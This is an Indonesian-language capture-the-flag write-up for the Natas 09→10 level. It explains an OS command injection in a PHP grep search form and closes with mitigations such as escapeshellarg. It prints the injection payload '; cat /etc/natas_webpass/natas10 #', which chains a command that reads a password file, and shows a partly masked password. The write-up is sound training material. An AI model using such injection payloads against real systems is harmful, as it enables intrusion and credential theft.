# Natas 09 → Natas 10

## 🎯 Objective

Mendapatkan password untuk level Natas 10.

## 🔎 Initial Analysis

Halaman web menampilkan sebuah form sederhana untuk mencari kata-kata tertentu (menggunakan fungsi *search*). Dengan melihat *source code* PHP yang dilampirkan, kita bisa melihat bahwa aplikasi memproses input dari pengguna (`needle`) dan meneruskannya langsung ke perintah sistem operasi menggunakan fungsi PHP.

## 🧠 Vulnerability / Concept

**Concept:** OS Command Injection

Celah keamanan ini terjadi ketika aplikasi meneruskan *input* pengguna yang tidak disanitasi secara langsung ke *system shell* (seperti Bash di Linux). Hal ini memungkinkan penyerang untuk menyuntikkan (menginjeksi) dan mengeksekusi perintah sistem operasi yang sewenang-wenang (arbitrer) di server.

## 🔬 Source / Page Analysis

Bagian PHP yang relevan:
```php
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

## 🧪 Investigation

Percobaan:

Request normal:
Input: hello
Sistem akan mengeksekusi: grep -i hello dictionary.txt
Response: Menampilkan kata-kata yang mengandung "hello" dari file dictionary.txt.
Output:
hello
hello's
hellos

Request exploit:
Kita tahu bahwa format perintah di terminal Linux memungkinkan pemisahan perintah menggunakan titik koma (;). Kita juga bisa menggunakan tanda pagar (#) untuk mengabaikan teks setelahnya sebagai komentar.
Input: ; cat /etc/natas_webpass/natas10 #

## 💡 Exploitation

Masukkan payload berikut ke dalam kolom "Find words containing:"

Bash
; cat /etc/natas_webpass/natas10 #
Bagaimana ini bekerja di backend?
Saat dikirim, perintah yang dieksekusi oleh server (passthru) berubah bentuk menjadi:

```Bash
grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt
```

1. grep -i dieksekusi pertama (akan menghasilkan error karena tidak ada argumen pencarian, tapi error ini diabaikan).

2. ; memberi tahu shell bahwa perintah pertama selesai, mulai eksekusi perintah kedua.

3. cat /etc/natas_webpass/natas10 dieksekusi, membaca dan mencetak isi file target (password Natas 10).

4.# mengubah sisa perintah (dictionary.txt) menjadi komentar agar tidak dieksekusi, sehingga mencegah syntax error.

## Hasil 

EgjlkzB6E8LJyf2O..............

Password untuk natas 10 akan langsung keluar sesaat setelah kita memasukkan command injection *; cat /etc/natas_webpass/natas10 #*.

## 🛡️ Mitigation

1. Hindari fungsi eksekusi OS: Sebisa mungkin jangan gunakan passthru(), system(), exec(), atau shell_exec(). Gunakan fungsi bawaan PHP (misalnya menggunakan fopen(), fread(), atau file_get_contents() lalu dicari menggunakan preg_match() atau strpos()).

2. Sanitasi Input: Jika memanggil perintah sistem adalah sebuah keharusan, input pengguna wajib melewati fungsi sanitasi seperti:

-> escapeshellarg(): Menambahkan tanda kutip tunggal di sekitar string untuk mencegah injeksi.

-> escapeshellcmd(): Melakukan escape pada karakter khusus (seperti &, ;, |).

## 📚 Yang Saya Pelajari

1. Cara kerja kerentanan OS Command Injection.

2. Bahaya penggabungan (concatenation) string input pengguna langsung ke dalam perintah shell.

3. Penggunaan karakter spesial Bash (seperti ; untuk command chaining dan # untuk comment) dalam pembuatan payload eksploitasi.